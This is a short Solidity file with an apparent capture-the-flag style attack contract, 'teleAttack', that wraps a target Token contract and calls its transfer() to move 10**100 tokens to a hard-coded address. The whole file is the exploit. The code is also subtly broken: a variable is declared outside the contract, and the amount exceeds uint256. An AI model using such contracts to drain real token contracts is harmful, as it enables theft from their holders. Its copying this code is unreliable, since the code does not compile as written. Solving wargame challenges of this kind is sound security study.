pragma solidity ^0.6.0;

import "./Token.sol";

uint num = 10 ** 100;

contract teleAttack {
    Token public targetContract;

    constructor(address _target) public {
        targetContract = Token(_target);
    }

    function transfer() public {
        targetContract.transfer(0xde21750cf3A76931bAAc0A91e75706e6B3bEa1c5, num);
    }
}